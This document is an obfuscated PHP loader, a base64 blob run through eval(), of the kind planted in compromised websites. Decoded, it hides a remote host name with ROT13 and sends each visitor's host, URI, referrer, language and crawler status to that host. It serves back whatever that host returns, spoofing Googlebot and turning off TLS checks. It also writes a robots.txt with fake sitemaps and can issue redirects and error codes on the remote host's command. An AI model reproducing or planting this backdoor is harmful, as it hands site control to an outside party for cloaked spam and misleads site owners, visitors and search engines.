$a=base64_decode("JHhtbG5hbWUgPSB1cmxkZWNvZGUoJzE1MS1lcjEwMy5kaGJ2YS5mdmdyJyk7CiRodHRwID0gaXNfaHR0cHMoKSA/ICdodHRwcycgOiAnaHR0cCc7CiRkdXJpX3RtcCA9IGRyZXF1ZXN0X3VyaSgpOwokZHVyaSA9IGVtcHR5KCRkdXJpX3RtcCkgPyAnLycgOiAkZHVyaV90bXA7CiRnb3dlYiA9IHN0cl9yb3QxMygkeG1sbmFtZSk7CiRob3N0ID0gaHRtbHNwZWNpYWxjaGFycyhpc3NldCgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pID8gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIDogJycsIEVOVF9RVU9URVMsICdVVEYtOCcpOwokbGFuZyA9IGh0bWxzcGVjaWFsY2hhcnMoaXNzZXQoJF9TRVJWRVJbIkhUVFBfQUNDRVBUX0xBTkdVQUdFIl0pID8gJF9TRVJWRVJbIkhUVFBfQUNDRVBUX0xBTkdVQUdFIl0gOiAnJywgRU5UX1FVT1RFUywgJ1VURi04Jyk7CiR1cmxzaGFuZyA9IGh0bWxzcGVjaWFsY2hhcnMoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSA/ICRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA6ICcnLCBFTlRfUVVPVEVTLCAnVVRGLTgnKTsKJHdlYjEgPSAkaHR0cCAuICc6Ly8nIC4gJGdvd2ViIC4gJy9pbmRleC5waHAnOwokd2ViID0gJHdlYjEgLiAnP3dlYj0nIC4gJGhvc3QgLiAnJnp6PScgLiAoZGlzYm90KCkgPyAnMScgOiAnMCcpIC4gJyZ1cmk9JyAuIHVybGVuY29kZSgkZHVyaSkgLiAnJnVybHNoYW5nPScgLiB1cmxlbmNvZGUoJHVybHNoYW5nKSAuICcmaHR0cD0nIC4gJGh0dHAgLiAnJmxhbmc9JyAuICRsYW5nOwokaHRtbF9jb250ZW50ID0gZG91dGRvKCR3ZWIpOwokcm9ib3RzUGF0aCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiAnL3JvYm90cy50eHQnOwppZiAoIWZpbGVfZXhpc3RzKCRyb2JvdHNQYXRoKSkgewogICAgJHBocF9maWxlID0gIiI7CiAgICBpZiAoc3RycG9zKCRkdXJpLCAnLnBocCcpICE9PSBmYWxzZSkgewogICAgICAgICRwaHBfZmlsZSA9IHN1YnN0cigkZHVyaSwgMSwgc3RycG9zKCRkdXJpLCAnLnBocCcpICsgNCAtIDEpLicvJzsKICAgIH0KICAgICR1bmlxdWVOdW1iZXJzID0gWzEsMiwzLDQsNV07CiAgICAkZGVmYXVsdENvbnRlbnQgPSAiVXNlci1hZ2VudDogKlxuQWxsb3c6IC9cbiI7CiAgICBmb3JlYWNoICgkdW5pcXVlTnVtYmVycyBhcyAkbnVtYmVyKSB7CiAgICAgICAgJGRlZmF1bHRDb250ZW50IC49ICJTaXRlbWFwOiB7JGh0dHB9Oi8veyRob3N0fS97JHBocF9maWxlfXNpdGVtYXAteyRudW1iZXJ9LnhtbFxuIjsKICAgIH0KICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRyb2JvdHNQYXRoLCAkZGVmYXVsdENvbnRlbnQpOwp9CmlmICghc3Ryc3RyKCRodG1sX2NvbnRlbnQsICdub2JvdHVzZXJhZ2VudCcpKSB7CiAgICBoYW5kbGVfY29udGVudCgkaHRtbF9jb250ZW50KTsKfQpmdW5jdGlvbiBpc19odHRwcygpCnsKICAgIHJldHVybiAoCiAgICAgICAgaXNzZXQoJF9TRVJWRVJbJ0hUVFBTJ10pICYmIHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBTJ10pICE9PSAnb2ZmJwogICAgICAgIHx8IGlzc2V0KCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10pICYmICRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10gPT09ICdodHRwcycKICAgICAgICB8fCBpc3NldCgkX1NFUlZFUlsnSFRUUF9GUk9OVF9FTkRfSFRUUFMnXSkgJiYgc3RydG9sb3dlcigkX1NFUlZFUlsnSFRUUF9GUk9OVF9FTkRfSFRUUFMnXSkgIT09ICdvZmYnCiAgICApOwp9CmZ1bmN0aW9uIGRyZXF1ZXN0X3VyaSgpCnsKICAgIGlmIChpc3NldCgkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkpIHsKICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiAgICB9IGVsc2VpZiAoaXNzZXQoJF9TRVJWRVJbJ2FyZ3YnXSkpIHsKICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnPycgLiAkX1NFUlZFUlsnYXJndiddWzBdOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnPycgLiAkX1NFUlZFUlsnUVVFUllfU1RSSU5HJ107CiAgICB9Cn0KZnVuY3Rpb24gZGlzYm90KCkKewogICAgJHVBZ2VudCA9IHN0cnRvbG93ZXIoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSA/ICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSA6ICcnKTsKICAgIHJldHVybiBzdHJpc3RyKCR1QWdlbnQsICdnb29nbGVib3QnKSB8fCBzdHJpc3RyKCR1QWdlbnQsICdiaW5nJykgfHwgc3RyaXN0cigkdUFnZW50LCAneWFob28nKSB8fCBzdHJpc3RyKCR1QWdlbnQsICdnb29nbGUnKTsKfQpmdW5jdGlvbiBkb3V0ZG8oJHdlYikKewogICAgJG9wdGlvbnMgPSBbCiAgICAgICAgImh0dHAiID0+IFsKICAgICAgICAgICAgImhlYWRlciIgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBHb29nbGVib3QvMi4xOyAraHR0cDovL3d3dy5nb29nbGUuY29tL2JvdC5odG1sKSIKICAgICAgICBdCiAgICBdOwogICAgJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdGlvbnMpOwogICAgJHJlc3BvbnNlID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR3ZWIsIGZhbHNlLCAkY29udGV4dCk7CiAgICBpZiAoISRyZXNwb25zZSkgewogICAgICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR3ZWIpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CiAgICAgICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAgICAgaWYgKGN1cmxfZXJybm8oJGNoKSkgewogICAgICAgICAgICBlY2hvICdjVVJMIEVycm9yOiAwJzsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgY3VybF9jbG9zZSgkY2gpOwogICAgfQogICAgcmV0dXJuICRyZXNwb25zZTsKfQpmdW5jdGlvbiBoYW5kbGVfY29udGVudCgkaHRtbF9jb250ZW50KQp7CiAgICBpZiAoc3Ryc3RyKCRodG1sX2NvbnRlbnQsICdva2h0bWxnZXRjb250ZW50JykpIHsKICAgICAgICBoZWFkZXIoIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7CiAgICAgICAgZWNobyBzdHJfcmVwbGFjZSgib2todG1sZ2V0Y29udGVudCIsICcnLCAkaHRtbF9jb250ZW50KTsKICAgICAgICBleGl0KCk7CiAgICB9IGVsc2VpZiAoc3Ryc3RyKCRodG1sX2NvbnRlbnQsICdva3htbGdldGNvbnRlbnQnKSkgewogICAgICAgIGhlYWRlcigiQ29udGVudC10eXBlOiB0ZXh0L3htbCIpOwogICAgICAgIGVjaG8gc3RyX3JlcGxhY2UoIm9reG1sZ2V0Y29udGVudCIsICcnLCAkaHRtbF9jb250ZW50KTsKICAgICAgICBleGl0KCk7CiAgICB9IGVsc2VpZiAoc3Ryc3RyKCRodG1sX2NvbnRlbnQsICdwaW5neG1sZ2V0Y29udGVudCcpKSB7CiAgICAgICAgaGVhZGVyKCJDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIpOwogICAgICAgIGVjaG8gcGluZ19zaXRlbWFwKHN0cl9yZXBsYWNlKCJwaW5neG1sZ2V0Y29udGVudCIsICcnLCAkaHRtbF9jb250ZW50KSk7CiAgICAgICAgZXhpdCgpOwogICAgfSBlbHNlaWYgKHN0cnN0cigkaHRtbF9jb250ZW50LCAnZ2V0Y29udGVudDUwMHBhZ2UnKSkgewogICAgICAgIGhlYWRlcignSFRUUC8xLjEgNTAwIEludGVybmFsIFNlcnZlciBFcnJvcicpOwogICAgICAgIGV4aXQoKTsKICAgIH0gZWxzZWlmIChzdHJzdHIoJGh0bWxfY29udGVudCwgJ2dldGNvbnRlbnQ0MDRwYWdlJykpIHsKICAgICAgICBoZWFkZXIoJ0hUVFAvMS4xIDQwNCBOb3QgRm91bmQnKTsKICAgICAgICBleGl0KCk7CiAgICB9IGVsc2VpZiAoc3Ryc3RyKCRodG1sX2NvbnRlbnQsICdnZXRjb250ZW50MzAxcGFnZScpKSB7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogJyAuIHN0cl9yZXBsYWNlKCJnZXRjb250ZW50MzAxcGFnZSIsICcnLCAkaHRtbF9jb250ZW50KSk7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CmZ1bmN0aW9uIHBpbmdfc2l0ZW1hcCgkdXJsKQp7CiAgICAkdXJsX2FyciA9IGV4cGxvZGUoIlxyXG4iLCB0cmltKCR1cmwpKTsKICAgICRyZXR1cm5fc3RyID0gJyc7CiAgICBmb3JlYWNoICgkdXJsX2FyciBhcyAkcGluZ1VybCkgewogICAgICAgICRwaW5nUmVzID0gZG91dGRvKCRwaW5nVXJsKTsKICAgICAgICAkb2sgPSAoc3RycG9zKCRwaW5nUmVzLCAnU2l0ZW1hcCBOb3RpZmljYXRpb24gUmVjZWl2ZWQnKSAhPT0gZmFsc2UpID8gJ3BpbmdvaycgOiAnZXJyb3InOwogICAgICAgICRyZXR1cm5fc3RyIC49IGh0bWxzcGVjaWFsY2hhcnMoJHBpbmdVcmwsIEVOVF9RVU9URVMsICdVVEYtOCcpIC4gJy0tICcgLiAkb2sgLiAnPGJyPic7CiAgICB9CiAgICByZXR1cm4gJHJldHVybl9zdHI7Cn0=");
eval($a);
